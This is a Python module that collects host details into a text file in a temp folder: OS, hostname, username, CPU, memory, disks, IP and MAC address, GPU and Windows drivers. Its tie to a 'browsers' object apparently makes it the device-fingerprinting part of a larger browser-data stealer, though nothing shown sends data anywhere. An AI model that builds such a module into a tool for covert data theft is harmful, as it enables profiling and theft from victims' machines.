import os
import platform
import psutil
import socket
import getpass
import time
import wmi 
import asyncio

class DeviceInfo:
    def __init__(self, browsers_instance):
        self.browsers = browsers_instance
        self.temp_path = self.browsers.temp_path
        self.info_file = os.path.join(self.temp_path, "device_info.txt")
        os.makedirs(self.temp_path, exist_ok=True)

    def get_os_info(self):
        """Gather OS and system details."""
        try:
            os_info = {
                "System": platform.system(),
                "Release": platform.release(),
                "Version": platform.version(),
                "Machine": platform.machine(),
                "Processor": platform.processor(),
                "Hostname": socket.gethostname(),
                "Username": getpass.getuser()
            }
            return os_info
        except Exception as e:
            print(f"OS info error: {e}")
            return {"Error": str(e)}

    def get_cpu_info(self):
        """Get CPU details."""
        try:
            cpu_info = {
                "Cores (Physical)": psutil.cpu_count(logical=False),
                "Cores (Total)": psutil.cpu_count(logical=True),
                "Usage (%)": psutil.cpu_percent(interval=1),
                "Frequency (MHz)": psutil.cpu_freq().current if psutil.cpu_freq() else "N/A"
            }
            return cpu_info
        except Exception as e:
            print(f"CPU info error: {e}")
            return {"Error": str(e)}

    def get_memory_info(self):
        """Get RAM details."""
        try:
            mem = psutil.virtual_memory()
            memory_info = {
                "Total (GB)": round(mem.total / (1024 ** 3), 2),
                "Available (GB)": round(mem.available / (1024 ** 3), 2),
                "Used (GB)": round(mem.used / (1024 ** 3), 2),
                "Usage (%)": mem.percent
            }
            return memory_info
        except Exception as e:
            print(f"Memory info error: {e}")
            return {"Error": str(e)}

    def get_disk_info(self):
        """Get disk usage for all partitions."""
        disks = {}
        for part in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(part.mountpoint)
                disks[part.device] = {
                    "Mount": part.mountpoint,
                    "Total (GB)": round(usage.total / (1024 ** 3), 2),
                    "Used (GB)": round(usage.used / (1024 ** 3), 2),
                    "Free (GB)": round(usage.free / (1024 ** 3), 2),
                    "Usage (%)": usage.percent
                }
            except Exception as e:
                disks[part.device] = {"Error": str(e)}
        return disks

    def get_network_info(self):
        """Get IP and MAC addresses."""
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            mac = "N/A"
            for interface in psutil.net_if_addrs().values():
                for addr in interface:
                    if addr.family == psutil.AF_LINK: 
                        mac = addr.address
                        break
                if mac != "N/A":
                    break
            network_info = {
                "IP Address": ip,
                "MAC Address": mac
            }
            return network_info
        except Exception as e:
            print(f"Network info error: {e}")
            return {"Error": str(e)}

    def get_gpu_info(self):
        """Get GPU details (Windows-focused)."""
        try:
            if platform.system() == "Windows":
                w = wmi.WMI()
                gpus = w.Win32_VideoController()
                return {f"GPU {i+1}": gpu.Name for i, gpu in enumerate(gpus)}
            else:
                return {"GPU": "N/A (Run 'lspci' on Linux or 'system_profiler' on macOS for details)"}
        except Exception as e:
            return {"GPU Error": str(e)}

    def get_driver_info(self):
        """Get driver details (Windows-focused)."""
        try:
            if platform.system() == "Windows":
                w = wmi.WMI()
                drivers = w.Win32_SystemDriver()
                return {d.Name: d.PathName for d in drivers[:10]} 
            else:
                return {"Drivers": "N/A (Windows-only via WMI)"}
        except Exception as e:
            return {"Driver Error": str(e)}

    async def extract_device_info(self):
        """Compile and save all device info."""
        info = {
            "Timestamp": time.ctime(),
            "OS": self.get_os_info(),
            "CPU": self.get_cpu_info(),
            "Memory": self.get_memory_info(),
            "Disks": self.get_disk_info(),
            "Network": self.get_network_info(),
            "GPU": self.get_gpu_info(),
            "Drivers": self.get_driver_info()
        }
        with open(self.info_file, "w", encoding="utf-8") as f:
            for section, data in info.items():
                f.write(f"{section}:\n")
                if isinstance(data, dict):
                    for key, value in data.items():
                        if isinstance(value, dict):
                            f.write(f"  {key}:\n")
                            for k, v in value.items():
                                f.write(f"    {k}: {v}\n")
                        else:
                            f.write(f"  {key}: {value}\n")
                else:
                    f.write(f"  {data}\n")
                f.write("\n")
        print(f"Device info saved to {self.info_file}")